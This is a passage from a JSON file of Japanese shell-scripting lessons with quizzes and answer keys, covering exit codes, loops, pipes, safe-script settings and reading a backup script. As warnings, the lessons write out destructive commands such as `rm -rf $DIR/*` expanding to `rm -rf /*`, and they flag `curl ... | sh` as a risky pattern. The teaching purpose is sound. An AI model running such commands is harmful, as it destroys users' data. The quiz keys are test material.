\"$file\" ]; then\n  echo \"使い方: $0 ファイル名\" >&2          # >&2 はエラーの出力へ（レッスン 5）\n  exit 1\nfi\nif [ -f \"$file\" ]; then\n  echo \"$file はファイルです（$(wc -l < \"$file\") 行）\"\nelif [ -d \"$file\" ]; then\n  echo \"$file はディレクトリです\"\nelse\n  echo \"$file は見つかりません\" >&2\n  exit 2\nfi\n```\n\n```text\n$ ./check.sh\n使い方: ./check.sh ファイル名            （終了コード 1）\n$ ./check.sh notes.txt\nnotes.txt はファイルです（3 行）        （終了コード 0）\n$ ./check.sh .\n. はディレクトリです\n$ ./check.sh nothing\nnothing は見つかりません                （終了コード 2）\n```\n\n`exit 番号` で、スクリプト自身の終了コードを決めています。こうしておくと、このスクリプトを他のスクリプトや CI から使ったときに、成功・失敗が伝わります。\n\n## && と ||：短い分岐\n\n```bash\ngrep -q b notes.txt && echo found || echo missing     # found\nmkdir -p build && cd build                            # mkdir が成功したら cd\ncommand -v jq || echo \"jq がありません\"                # jq が無ければ表示\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `A && B` | A が **成功したら** B |\n| `A \\|\\| B` | A が **失敗したら** B |\n| `A && B \\|\\| C` | A が成功したら B、失敗したら C（⚠️ B が失敗しても C が動く。厳密には if と違う） |\n\n## case：値で分ける\n\n```bash\ncase \"$1\" in\n  start) echo \"開始します\" ;;\n  stop)  echo \"停止します\" ;;\n  *)     echo \"start か stop を指定してください\" ;;\nesac\n```\n\nPython の `match` 文に当たります。`*)` はどれにも当たらなかったとき（Python の `case _:`）、`;;` は 1 つの場合の終わり、`esac` は case を逆から書いたものです。`start|begin)` のように `|` で複数書けます。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方・チェック |\n|---|---|\n| `if [ $# -lt 1 ]; then echo \"usage: ...\"; exit 1; fi` | 引数が 1 つも無ければ使い方を出して終わる（定番の書き出し） |\n| `if ! command -v docker >/dev/null; then` | docker が入っていなければ |\n| `[ $x = \"y\" ]` | ⚠️ 引用符が無い。x が空だとエラー |\n| `[ \"$a\" > \"$b\" ]` | ⚠️ `>` はリダイレクト（レッスン 5）になり、`$b` という名前のファイルができてしまう。数なら `-gt` |\n| `cd dir \\|\\| exit 1` | cd に失敗したら止まる（レッスン 6） |\n| `exit 0` が最後にある | 成功で終わる（途中の失敗を隠していないか注意） |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "シェルで「成功」を表す終了コードは？",
        "choices": [
         "0",
         "1",
         "-1"
        ],
        "answer": 0,
        "explain": "0 が成功、0 以外が失敗です。Python の True(1)/False(0) と逆なので注意します。"
       },
       {
        "question": "`[ 3 -gt 10 ]` と `[ \"3\" \\> \"10\" ]` の結果は？",
        "choices": [
         "どちらも偽",
         "どちらも真",
         "前は偽（数として比べる）、後は真（文字として \"3\" > \"1\" と比べる）"
        ],
        "answer": 2,
        "explain": "`-gt` は数の比較、`>` は文字の比較です。数を比べるときは `-gt` などか、`(( ))` を使います。"
       },
       {
        "question": "`mkdir -p build && cd build` の意味は？",
        "choices": [
         "mkdir と cd を同時に実行する",
         "mkdir が成功したときだけ cd する",
         "mkdir が失敗したときだけ cd する"
        ],
        "answer": 1,
        "explain": "`&&` は「左が成功したら右」です。失敗したら右は実行されません。"
       }
      ]
     ],
     "id": "03-conditions-exit-codes"
    },
    {
     "title": "繰り返し・関数・引数 ― for・while・\"$@\"",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "loops",
      "functions",
      "tooling"
     ],
     "summary": "for でリストやファイルを順に処理する、while read で 1 行ずつ読む、関数と local、スクリプトに渡された引数（$1・$#・\"$@\"）。\"$@\" を引用符で囲む理由を実際の出力で。",
     "body": "## このレッスンのゴール\n\n- `for` と `while read` の繰り返しを読める\n- シェルの関数と `local` を読める\n- 引数の `$1`・`$#`・`\"$@\"` の意味が分かり、`\"$@\"` と `$@` の違いを説明できる\n\n## for：並んだものを順番に\n\n```bash\nfor name in Ryo Hana \"Ken Sato\"; do\n  echo \"こんにちは、${name} さん\"\ndone\n```\n\n```text\nこんにちは、Ryo さん\nこんにちは、Hana さん\nこんにちは、Ken Sato さん\n```\n\n| 部分 | 意味 | Python で言うと |\n|---|---|---|\n| `for name in A B C; do` | A・B・C を順番に name に入れて | `for name in [\"A\", \"B\", \"C\"]:` |\n| `done` | 繰り返しの終わり | （インデントの終わり） |\n\n並べたものは **スペースで区切られる** ので、`\"Ken Sato\"` のようにスペースを含むものは引用符で 1 つにまとめます。\n\n### ファイルを順番に\n\n```bash\nfor f in *.txt; do\n  echo \"txt: $f\"\ndone\n```\n\n```text\ntxt: my file.txt\ntxt: notes.txt\n```\n\n`*.txt` は「.txt で終わるファイル全部」に置き換わります（**グロブ**）。スペースを含む「my file.txt」も、ちゃんと 1 つとして扱われています。Python の `for f in Path(\".\").glob(\"*.txt\"):` です。\n\n⚠️ 当てはまるファイルが 1 つも無いと、`*.txt` という **文字そのもの** が 1 回だけ入ってきます。`[ -e \"$f\" ] || continue` で飛ばすコードをよく見るのはこのためです。\n\n⚠️ `for f in $(ls)` という書き方も見かけますが、**スペースを含むファイル名で分かれてしまう** ので、グロブ（`for f in *`）を使うのが正解です（レッスン 7 で実例を見ます）。\n\n### 数で繰り返す\n\n```bash\nfor i in 1 2 3; do echo \"$i\"; done\nfor i in $(seq 1 5); do echo \"$i\"; done        # 1〜5\nfor ((i = 0; i < 3; i++)); do echo \"$i\"; done   # C 言語風。0, 1, 2\n```\n\n## while read：1 行ずつ読む\n\n```bash\ni=0\nwhile read -r line; do\n  i=$((i + 1))\n  echo \"$i: $line\"\ndone < notes.txt\n```\n\n```text\n1: a\n2: b\n3: c\n```\n\n| 部分 | 意味 |\n|---|---|\n| `while コマンド; do ... done` | コマンドが成功している間くり返す |\n| `read -r line` | 1 行読んで line に入れる。読めなくなったら（ファイルの終わり）失敗 → 繰り返しが終わる |\n| `-r` | `\\` を特別扱いしない（付けておくのが定番） |\n| `done < notes.txt` | 繰り返し全体の入力を notes.txt にする（レッスン 5） |\n\nPython の `for line in open(\"notes.txt\"):` に当たります。コマンドの出力を 1 行ずつ処理するなら `コマンド | while read -r line; do ... done` と書きます。\n\n## 関数\n\n```bash\ngreet() {\n  local who=\"$1\"\n  echo \"こんにちは、${who} さん\"\n}\n\ngreet \"Ryo\"     # こんにちは、Ryo さん\n```\n\n| 部分 | 意味 | Python で言うと |\n|---|---|---|\n| `greet() { ... }` | 関数の定義 | `def greet(who):` |\n| `$1`, `$2` … | 関数に渡された 1 つ目、2 つ目の値 | 引数 |\n| `local who=...` | **この関数の中だけ** の変数 | 関数の中のローカル変数 |\n| `greet \"Ryo\"` | 呼び出し。**かっこも `,` も使わない** | `greet(\"Ryo\")` |\n\n⚠️ `local` を付けないと、関数の中で作った変数は **スクリプト全体で共有** されます（Python と逆）。同じ名前の変数を知らないうちに上書きする原因になります。\n\n関数の「戻り値」は、2 つの方法があります。\n\n| やりたいこと | 書き方 |\n|---|---|\n| 文字を返す | 関数の中で `echo` し、呼ぶ側で `result=\"$(greet Ryo)\"` と受け取る |\n| 成功・失敗を返す | `return 0` / `return 1`（終了コード。0〜255 の数だけ） |\n\n## スクリプトの引数\n\nスクリプトを実行するときに渡した値は、こう受け取ります。\n\n```bash\n./loop.sh start \"a b\"\n```\n\n| 書き方 | 中身 | Python で言うと |\n|---|---|---|\n| `$0` | スクリプトの名前（`./loop.sh`） | `sys.argv[0]` |\n| `$1` | 1 つ目（`start`） | `sys.argv[1]` |\n| `$2` | 2 つ目（`a b`） | `sys.argv[2]` |\n| `$#` | 引数の数（`2`） | `len(sys.argv) - 1` |\n| `\"$@\"` | 全部の引数（1 つずつ別々に） | `sys.argv[1:]` |\n\n### \"$@\" と $@ の違い\n\n```bash\nfor arg in \"$@\"; do echo \"[\\\"\\$@\\\"] $arg\"; done\nfor arg in $@;   do echo \"[\\$@] $arg\"; done\n```\n\n```text\n[\"$@\"] start\n[\"$@\"] a b          ← 「a b」が 1 つのまま\n[$@] start\n[$@] a              ← スペースで分かれてしまった\n[$@] b\n```\n\n引用符を付けた `\"$@\"` は、**渡されたとおりの区切りを守ります**。付けない `$@` は、レッスン 2 の単語分割が起きます。**引数をそのまま別のコマンドに渡すときは、必ず `\"$@\"`** です。\n\n```bash\n#!/usr/bin/env bash\n# 引数を全部そのまま pytest に渡すスクリプト\nexec python -m pytest \"$@\"\n```\n\n`$*` という似た書き方もありますが、引数を 1 つの文字列にまとめてしまうので、ほとんどの場合 `\"$@\"` が正解です。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `for f in $(ls *.csv)` | ⚠️ スペースを含むファイル名で壊れる。`for f in *.csv` |\n| `for f in *.log; do` の中に `[ -e \"$f\" ] \\|\\| continue` | ✅ ファイルが 1 つも無いときの対策 |\n| `cat file \\| while read line` | `-r` が無いと `\\` が消える。`while read -r line; do ... done < file` が定番 |\n| 関数の中で `local` を使っていない | ⚠️ スクリプト全体の変数を上書きしていないか |\n| `python app.py $@` | ⚠️ `\"$@\"` に |\n| `shift` | 引数を 1 つずらす（`$2` が `$1` になる）。オプションを順に読むときに使う |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`./run.sh \"hello world\" test` を実行したとき、スクリプトの中の `$#` と `$1` は？",
        "choices": [
         "`$#` は 3、`$1` は `hello`",
         "`$#` は 2、`$1` は `hello world`",
         "`$#` は 2、`$1` は `./run.sh`"
        ],
        "answer": 1,
        "explain": "引用符で囲んだ「hello world」は 1 つの引数です。`$0` がスクリプト名、`$1` が 1 つ目の引数です。"
       },
       {
        "question": "受け取った引数を、区切りを変えずにそのまま別のコマンドに渡す書き方は？",
        "choices": [
         "`$@`",
         "`$*`",
         "`\"$@\"`"
        ],
        "answer": 2,
        "explain": "引用符を付けた `\"$@\"` だけが、元の引数の区切りを守ります。`$@` だとスペースで分かれます。"
       },
       {
        "question": "関数の中の変数に `local` を付ける理由は？",
        "choices": [
         "処理が速くなるから",
         "付けないと、スクリプト全体の同じ名前の変数を上書きしてしまうから",
         "付けないと関数が動かないから"
        ],
        "answer": 1,
        "explain": "シェルでは、関数の中の変数も初期設定ではスクリプト全体で共有されます。`local` でその関数の中だけにします。"
       }
      ]
     ],
     "id": "04-loops-functions"
    },
    {
     "title": "パイプとテキスト処理 ― ログを 1 行で集計する",
     "level": 2,
     "minutes": 20,
     "concepts": [
      "io",
      "strings",
      "tooling"
     ],
     "summary": "標準出力と標準エラー、> と 2>&1 と /dev/null、パイプでつなぐ考え方。grep・cut・awk・sed・sort・uniq・wc・xargs・jq を、実際の Web サーバーのログを集計しながら読む。",
     "body": "## このレッスンのゴール\n\n- 標準出力・標準エラーと、`>`・`2>`・`2>&1`・`/dev/null` の意味を説明できる\n- `|`（パイプ）でつないだ長いコマンドを、左から順に読める\n- `grep`・`awk`・`sort | uniq -c` などのテキスト処理の定番の形が分かる\n\nターミナルと Git のコースのレッスン 2 で、`|` と `>` を簡単に紹介しました。ここでは、AI がよく出してくる **1 行の集計コマンド** を読めるようにします。\n\n## 2 つの出力：標準出力と標準エラー\n\nコマンドの出力には、2 つの通り道があります。\n\n| 名前 | 番号 | 流れるもの | Python で言うと |\n|---|---|---|---|\n| **標準出力**（stdout） | 1 | 普通の結果 | `print(...)` |\n| **標準エラー**（stderr） | 2 | エラーや進み具合のメッセージ | `print(..., file=sys.stderr)` |\n| 標準入力（stdin） | 0 | コマンドへの入力 | `input()`、`sys.stdin` |\n\n画面ではどちらも同じように見えますが、**別々に扱えます**。\n\n```bash\nls nope > out.txt 2> err.txt\n# out.txt は空、err.txt に「ls: cannot access 'nope': No such file or directory」\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `> file` | 標準出力をファイルへ（上書き） |\n| `>> file` | 標準出力をファイルの末尾へ |\n| `2> file` | 標準エラーをファイルへ |\n| `> file 2>&1` | **両方** を同じファイルへ（「2 番を 1 番と同じ所へ」） |\n| `> /dev/null` | 捨てる（`/dev/null` は何でも吸い込んで消す特別な場所） |\n| `2> /dev/null` | エラーだけ捨てる |\n| `< file` | ファイルを標準入力にする |\n| `>&2` | 自分の出力を標準エラーへ（レッスン 3 のスクリプトのエラーメッセージ） |\n\n⚠️ `2>&1` は **書く順番** が大事です。`> file 2>&1` は両方がファイルへ行きますが、`2>&1 > file` は、エラーは画面に残ります。\n\nAI のコードの `command -v jq > /dev/null 2>&1` は、「出力もエラーも全部捨てて、**終了コード（あるかどうか）だけ** を使う」という意味です。\n\n## パイプ：左の出力を右の入力に\n\n```bash\ngrep \" 500 \" access.log | wc -l\n```\n\n`|` は、**左のコマンドの標準出力を、右のコマンドの標準入力につなぎます**。小さなコマンドをつないで、大きな処理を作るのがシェルの考え方です。\n\nPython で言うと、関数の結果を次の関数に渡し続けるのと同じです。\n\n```python\nlen([line for line in open(\"access.log\") if \" 500 \" in line])\n```\n\n## 例のログ\n\nWeb サーバーのアクセスログ（公開とクラウドのコースのレッスン 8）です。\n\n```text\n2026-11-23T09:00:01 GET /tasks 200 12ms\n2026-11-23T09:00:05 POST /orders 500 40ms\n2026-11-23T09:01:10 GET /tasks 200 9ms\n2026-11-23T09:02:00 GET /users/3 404 5ms\n2026-11-23T09:03:30 POST /orders 201 35ms\n2026-11-23T09:04:12 GET /tasks 200 11ms\n2026-11-23T09:05:00 POST /orders 500 52ms\n```\n\n空白で区切ると、1 列目が時刻、2 列目がメソッド、3 列目がパス、4 列目がステータス、5 列目が時間です。\n\n## grep：探す\n\n```bash\ngrep \" 500 \" access.log | wc -l      # 2   （500 エラーの行数）\n```\n\n| オプション | 意味 |\n|---|---|\n| `-i` | 大文字小文字を区別しない |\n| `-v` | 当てはまら **ない** 行 |\n| `-c` | 行数だけ |\n| `-n` | 行番号も |\n| `-r` | ディレクトリの中を全部 |\n| `-q` | 何も出さず、終了コードだけ（レッスン 3） |\n| `-E` | 正規表現（`grep -E \"500\\|404\"`） |\n\n## awk・cut：列を取り出す\n\n```bash\ncut -d' ' -f2,3 access.log | head -3\n# GET /tasks\n# POST /orders\n# GET /tasks\n\nawk '{print $3}' access.log           # 3 列目（パス）だけ\n```\n\n| コマンド | 意味 |\n|---|---|\n| `cut -d' ' -f2,3` | 区切り（`-d`）を空白にして、2・3 列目（`-f`） |\n| `awk '{print $3}'` | 空白で区切った 3 列目。⚠️ ここの `$3` はシェルの引数ではなく **awk の列**。だからシングルクォートで囲む（レッスン 2） |\n\nawk は小さなプログラミング言語で、計算もできます。\n\n```bash\nawk '{gsub(\"ms\", \"\", $5); s += $5} END {print \"平均\", s/NR, \"ms\"}' access.log\n# 平均 23.4286 ms\n```\n\n「5 列目から ms を消して足していき、最後（`END`）に行数（`NR`）で割る」。Python で言うと、こうです。\n\n```python\ntimes = [int(line.split()[4].removesuffix(\"ms\")) for line in open(\"access.log\")]\nprint(\"平均\", sum(times) / len(times), \"ms\")\n```\n\n## sort | uniq -c：数える定番\n\n```bash\nawk '{print $3}' access.log | sort | uniq -c | sort -rn\n```\n\n```text\n      3 /tasks\n      3 /orders\n      1 /users/3\n```\n\n| 段階 | 出力 |\n|---|---|\n| `awk '{print $3}'` | パスだけを 7 行 |\n| `sort` | 同じものが隣り合うように並べる |\n| `uniq -c` | **隣り合った** 同じ行をまとめて、数を付ける |\n| `sort -rn` | 数（`-n`）の大きい順（`-r`）に並べる |\n\n**「何が何回出てきたか」のランキング** です。`uniq` は隣り合ったものしかまとめないので、先に `sort` するのがポイントです。Python の `collections.Counter(paths).most_common()`、SQL の `GROUP BY ... ORDER BY COUNT(*) DESC`（SQL コースのレッスン 3）と同じことをしています。\n\n## sed：置き換える\n\n```bash\nsed 's/ms$/ ミリ秒/' access.log | tail -1\n# 2026-11-23T09:05:00 POST /orders 500 52 ミリ秒\n```\n\n`s/探す/置き換え/` は「行の中の最初の 1 つを置き換え」、`s/.../.../g` は全部です。`$` は「行の終わり」（正規表現）。\n\n⚠️ `sed -i` は **ファイルそのものを書き換えます**（Mac では `sed -i ''` と書く必要があるなど、OS で書き方が違う）。AI が `sed -i` を出してきたら、先に `-i` 無しで結果を確かめると安全です。\n\n## その他の定番\n\n| コマンド | 意味 | 例 |\n|---|---|---|\n| `wc -l` | 行数 | `wc -l < file` |\n| `head -n 5` / `tail -n 5` | 先頭／末尾の 5 行 | |\n| `tail -f app.log` | 追加される行を流し続けて見る（Ctrl+C で終わる） | ログの監視 |\n| `xargs` | 入力の各行を、次のコマンドの引数にする | `printf 'a.txt\\nb.txt\\n' \\| xargs -I{} echo \"処理: {}\"` |\n| `tee` | 画面にも出しつつファイルにも書く | `make 2>&1 \\| tee build.log` |\n| `jq` | JSON を扱う | `curl ... \\| jq '.orders \\| length'` |\n\n```bash\necho '{\"name\":\"Ryo\",\"orders\":[{\"id\":1},{\"id\":2}]}' | jq '.orders | length'\n# 2\n```\n\n`jq` は、API の返事（JSON）から値を取り出すときによく使われます（`.name` で name、`.orders[0].id` で最初の注文の id）。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方・チェック |\n|---|---|\n| `... \\| sort \\| uniq -c \\| sort -rn \\| head` | 何が何回出たかの上位 |\n| `> /dev/null 2>&1` | 出力を全部捨てて、成功・失敗だけを見る |\n| `2>/dev/null` がたくさん | ⚠️ エラーを隠している。失敗に気づけないかも |\n| `grep ... \\| awk '{print $2}' \\| xargs kill` | 見つけたプロセスの番号を取り出して止める。⚠️ 何に当たるか、先に `grep` だけ実行して確かめる |\n| `sed -i 's/.../.../g' *.py` | ⚠️ たくさんのファイルを直接書き換える。Git でコミットしてから |\n| `curl -s URL \\| jq -r '.token'` | API の返事から値を取り出す。`-r` は引用符なしの文字で |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`python app.py > app.log 2>&1` の意味は？",
        "choices": [
         "標準出力だけを app.log に書き、エラーは画面に出す",
         "標準出力と標準エラーの両方を app.log に書く",
         "app.log の内容を python app.py に渡す"
        ],
        "answer": 1,
        "explain": "`2>&1` は「2 番（標準エラー）を 1 番（標準出力）と同じ所へ」です。1 番が app.log なので、両方がファイルに入ります。"
       },
       {
        "question": "`awk '{print $3}' access.log | sort | uniq -c` で、`sort` が必要な理由は？",
        "choices": [
         "結果をきれいに見せるため",
         "`uniq` は隣り合った同じ行しかまとめないので、先に同じものを並べる必要があるから",
         "awk の出力は並べ替えないと読めないから"
        ],
        "answer": 1,
        "explain": "sort で同じパスを隣に集めてから、uniq -c で数えます。sort が無いと、離れた同じ行が別々に数えられます。"
       },
       {
        "question": "`awk '{print $3}'` をシングルクォートで囲む理由は？",
        "choices": [
         "`$3` をシェルの引数として置き換えずに、そのまま awk に渡すため",
         "awk の命令は必ずシングルクォートで書く決まりだから",
         "ダブルクォートでは日本語が使えないから"
        ],
        "answer": 0,
        "explain": "ダブルクォートだと、シェルが先に `$3`（スクリプトの 3 つ目の引数）に置き換えてしまいます。awk の列の `$3` として渡すために、シングルクォートで囲みます。"
       }
      ]
     ],
     "id": "05-pipes-text"
    },
    {
     "title": "安全なスクリプト ― set -euo pipefail・空の変数・trap",
     "level": 3,
     "minutes": 18,
     "concepts": [
      "errors",
      "security",
      "tooling"
     ],
     "summary": "シェルは失敗しても止まらずに次の行へ進む。それを止める set -e・-u・pipefail を 1 つずつ試し、空の変数で rm が暴走するのを ${VAR:?} で防ぎ、trap で後片付けをする。ShellCheck の紹介も。",
     "body": "## このレッスンのゴール\n\n- シェルが「失敗しても止まらない」ことと、`set -euo pipefail` のそれぞれの意味を説明できる\n- 空の変数を使った `rm` の危険と、`${VAR:?}` での防ぎ方が分かる\n- `trap ... EXIT` と `mktemp` を使った後片付けのコードを読める\n\n## シェルは失敗しても止まらない\n\n```bash\n#!/usr/bin/env bash\ncd /no/such/dir\necho \"ここが実行されると困る（cd に失敗したのに続いている）\"\n```\n\n```text\nsafe.sh: line 2: cd: /no/such/dir: No such file or directory\nここが実行されると困る（cd に失敗したのに続いている）\n```\n\n`cd` に失敗したのに、**次の行が実行されました**。Python なら例外で止まりますが、シェルは **エラーを表示して、何事も無かったように次へ進みます**。\nもし次の行が `rm -rf *` だったら？ **`cd` に失敗して、元の場所のファイルを全部消す** ことになります。\n\n## set -e：失敗したら止まる\n\n```bash\n#!/usr/bin/env bash\nset -euo pipefail\ncd /no/such/dir\necho \"ここが実行されると困る\"\n```\n\n```text\nsafe.sh: line 3: cd: /no/such/dir: No such file or directory\n（ここで止まった。終了コード 1）\n```\n\n`set -e` は「**どれかのコマンドが失敗したら、そこでスクリプトを止める**」設定です。Python の「例外が起きたら止まる」に近い動きになります。\n\n⚠️ ただし、`if` の条件や `&&`・`||` の途中で失敗したものは止まりません（失敗するのが前提の書き方なので）。\n\n## set -u：無い変数を使ったら止まる\n\n```bash\nset -u\necho \"$TYPO_VAR\"\n# bash: line 1: TYPO_VAR: unbound variable\n```\n\nレッスン 2 で、無い変数は **空として扱われる** と学びました。打ち間違いでも黙って空になるので、とても危険です。`set -u` があると、**定義されていない変数を使った時点で止まります**。\n\nわざと「無ければ空」にしたいところは、`\"${VAR:-}\"`（無ければ空文字）と書きます。\n\n## set -o pipefail：パイプの途中の失敗に気づく\n\n```bash\nfalse | true; echo \"pipefail なし: $?\"     # 0\nset -o pipefail\nfalse | true; echo \"pipefail あり: $?\"     # 1\n```\n\nパイプの終了コードは、初期設定では **最後のコマンドのもの** だけです。途中で失敗しても、最後が成功すれば「成功」になります。たとえば `curl URL | jq .` で、ダウンロードに失敗しても気づけません。\n`pipefail` があると、**途中のどれかが失敗したら、パイプ全体が失敗** になります。\n\n## 3 つまとめて\n\n```bash\n#!/usr/bin/env bash\nset -euo pipefail\n```\n\n| 部分 | 意味 |\n|---|---|\n| `-e` | 失敗したら止まる |\n| `-u` | 定義されていない変数を使ったら止まる |\n| `-o pipefail` | パイプの途中の失敗も失敗にする |\n\nAI が書くシェルスクリプトの 2 行目によく入っている、**お決まりの 1 行** です。無いスクリプトは、失敗しても気づけない作りになっていると考えて読みます。\n\n## ⚠️ 空の変数と rm\n\n```bash\nDIR=\"\"\nrm -rf $DIR/*       # → rm -rf /*   （コンピュータ全体を消そうとする！）\n```\n\n`DIR` が空だと、`$DIR/*` は `/*` になります。設定の読み込み忘れ・打ち間違い・前の行の失敗など、**変数が空になる理由はいくらでもあります**。実際に、有名なソフトのアンインストール用のスクリプトでこれが起き、利用者のファイルが消えた事件が何度もありました。\n\n（この教材を作っているときも、Claude Code の安全装置が、作業用のフォルダを消そうとした `rm -rf $D` を「変数が空なら `rm -rf /` になる」と止めました。それくらい危ない形です）\n\n### 防ぎ方\n\n```bash\n: \"${DIR:?DIR が空です}\"            # DIR が空なら、メッセージを出して止まる\nrm -rf -- \"${DIR:?DIR が空です}/build\"\n```\n\n```text\nbash: line 1: DIR: DIR が空です\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `${DIR:?メッセージ}` | DIR が空か未定義なら、メッセージを出して **その場で止まる** |\n| `\"...\"` で囲む | スペースで分かれるのを防ぐ（レッスン 2） |\n| `--` | 「ここから後はオプションではなくファイル名」。`-rf` という名前のファイルがあっても安全 |\n| `set -u` | 未定義の変数で止まる（ただし **空文字の変数は止まらない** ので、`:?` も必要） |\n\n## trap：終わるときに必ず後片付け\n\n一時的なファイルを作るスクリプトは、**途中で失敗しても** 後片付けをしたいものです。\n\n```bash\n#!/usr/bin/env bash\nset -euo pipefail\ntmp=\"$(mktemp -d)\"\ntrap 'echo \"後片付け: $tmp を消します\"; rm -r -- \"$tmp\"' EXIT\necho \"作業中: $tmp\"\nfalse                         # ここで失敗する\necho \"ここには来ない\"\n```\n\n```text\n作業中: /tmp/tmp.XXXX\n後片付け: /tmp/tmp.XXXX を消します     ← 失敗して止まったのに、後片付けは実行された\n（終了コード 1）\n```\n\n| 部分 | 意味 | Python で言うと |\n|---|---|---|\n| `mktemp -d` | 他と重ならない名前の一時ディレクトリを作る | `tempfile.mkdtemp()` |\n| `trap 'コマンド' EXIT` | スクリプトが **どんな理由で終わっても**、最後にコマンドを実行する | `try: ... finally:` |\n\n`trap '...' INT` なら Ctrl+C で止められたとき、`ERR` なら失敗したとき、のようにきっかけを選べます。\n\n## ShellCheck：シェルスクリプトの検査\n\n**ShellCheck** は、シェルスクリプトのよくある間違い（引用符の付け忘れ、`for f in $(ls)`、`[ $x = y ]` など）を指摘してくれる道具です。VS Code の拡張機能もあります。\n\n```text\nSC2086: Double quote to prevent globbing and word splitting.\n（ダブルクォートで囲んで、単語分割とグロブを防いでください）\n```\n\nこの警告が出たら、レッスン 2 の「変数は `\"$var\"`」の話です。AI のシェルスクリプトを動かす前に通すと安心です。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 判定 |\n|---|---|\n| `set -euo pipefail` が無い | ⚠️ 失敗しても続く。特に `cd` の後に `rm` があるなら危険 |\n| `cd \"$dir\"` の後に `rm` / `mv` | `set -e` か `cd \"$dir\" \\|\\| exit 1` があるか |\n| `rm -rf $VAR/` / `rm -rf \"$VAR\"/*` | ⚠️⚠️ VAR が空だと `/` を消す。`${VAR:?}` に |\n| `trap 'rm -rf \"$tmp\"' EXIT` | ✅ 後片付け |\n| `/tmp/myapp.tmp` のような決め打ちの一時ファイル | 同時に動かすとぶつかる。`mktemp` |\n| `curl ... \\| sh` に `set -o pipefail` が無い | ダウンロードに失敗しても、途中までのスクリプトが実行されうる |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`set -e` が無いスクリプトで、`cd build` が失敗した。次の行の `rm -rf *` はどうなる？",
        "choices": [
         "cd が失敗したので、rm も自動で止まる",
         "実行される。元のディレクトリのファイルが消えてしまう",
         "エラーになって何も消えない"
        ],
        "answer": 1,
        "explain": "シェルは失敗しても次の行へ進みます。`set -e` を付けるか、`cd build || exit 1` のように失敗したら止まるようにします。"
       },
       {
        "question": "`rm -rf \"${BUILD_DIR:?}/dist\"` の `:?` の役割は？",
        "choices": [
         "BUILD_DIR が空か未定義なら、rm を実行せずにその場で止める",
         "BUILD_DIR が空なら、今のディレクトリを使う",
         "BUILD_DIR の中身を確認する画面を出す"
        ],
        "answer": 0,
        "explain": "変数が空だと `/dist` を消すことになります。`:?` があれば、空のときはエラーで止まります。"
       },
       {
        "question": "`trap 'rm -r -- \"$tmp\"' EXIT` の意味は？",
        "choices": [
         "今すぐ tmp を消す",
         "スクリプトが失敗しても成功しても、終わるときに tmp を消す",
         "tmp が消されないように守る"
        ],
        "answer": 1,
        "explain": "EXIT のきっかけで、終わり方に関係なく後片付けが実行されます。Python の `finally` に当たります。"
       }
      ]
     ],
     "id": "06-safe-scripts"
    },
    {
     "title": "実際のスクリプトを読む ― バックアップを自動で取る",
     "level": 3,
     "minutes": 18,
     "concepts": [
      "tooling",
      "reading",
      "errors",
      "ai_coding"
     ],
     "summary": "AI に頼んだら出てきそうな「SQLite のバックアップを取って、古いものを消す」スクリプトを 1 行ずつ読む。実際に動かした出力つき。読めるようになったうえで、潜んでいた 1 つの弱点を見つけて直す。",
     "body": "## このレッスンのゴール\n\n- このコースの知識だけで、40 行ほどのシェルスクリプトを 1 行ずつ説明できる\n- スクリプトを動かす前に、何が消えたり変わったりするかを予想できる\n- よくある弱点を見つけ、直し方を提案できる\n\n## 頼んだこと\n\n> SQLite のデータベース（app.db）を毎日バックアップするシェルスクリプトを作って。バックアップは新しい 5 個だけ残して、古いものは消して。\n\n出てきた（という想定の）スクリプトです。\n\n```bash\n#!/usr/bin/env bash\n# SQLite のデータベースをバックアップし、新しいものを 5 個だけ残す\nset -euo pipefail\n\nDB_PATH=\"${DB_PATH:-./app.db}\"\nBACKUP_DIR=\"${BACKUP_DIR:-./backups}\"\nKEEP=\"${KEEP:-5}\"\n\nlog() {\n  echo \"[$(date '+%H:%M:%S')] $*\"\n}\n\nif [[ ! -f \"$DB_PATH\" ]]; then\n  log \"データベースが見つかりません: $DB_PATH\" >&2\n  exit 1\nfi\n\nmkdir -p \"$BACKUP_DIR\"\ndest=\"$BACKUP_DIR/app-$(date +%Y-%m-%d).db\"\n\npython3 -c \"import sqlite3, sys; sqlite3.connect(sys.argv[1]).backup(sqlite3.connect(sys.argv[2]))\" \"$DB_PATH\" \"$dest\"\nlog \"バックアップしました: $dest ($(du -h \"$dest\" | cut -f1))\"\n\ncount=0\nfor f in $(ls -1t \"$BACKUP_DIR\"/app-*.db); do\n  count=$((count + 1))\n  if (( count > KEEP )); then\n    log \"古いバックアップを削除: $f\"\n    rm -- \"$f\"\n  fi\ndone\n\nlog \"完了（残り $(ls \"$BACKUP_DIR\"/app-*.db | wc -l) 個）\"\n```\n\n✏️ 先を読む前に、**このスクリプトを実行すると何が起きるか**、上から順に自分の言葉で説明してみましょう。\n\n## 1 行ずつ読む\n\n### 準備（1〜7 行目）\n\n```bash\n#!/usr/bin/env bash\nset -euo pipefail\n```\n\nbash で動かす（レッスン 1）。失敗・未定義の変数・パイプの途中の失敗で止まる（レッスン 6）。\n\n```bash\nDB_PATH=\"${DB_PATH:-./app.db}\"\nBACKUP_DIR=\"${BACKUP_DIR:-./backups}\"\nKEEP=\"${KEEP:-5}\"\n```\n\n**環境変数があればそれを使い、無ければ初期値**（レッスン 2 の `${x:-値}`）。`KEEP=10 ./backup.sh` と実行すれば、10 個残すように変えられます。\n\n### 関数（9〜11 行目）\n\n```bash\nlog() {\n  echo \"[$(date '+%H:%M:%S')] $*\"\n}\n```\n\n時刻を付けて表示する関数（レッスン 4）。`$*` は渡された引数をまとめた 1 つの文字列で、表示するだけなのでここではこれで十分です。\n\n### 確認（13〜16 行目）\n\n```bash\nif [[ ! -f \"$DB_PATH\" ]]; then\n  log \"データベースが見つかりません: 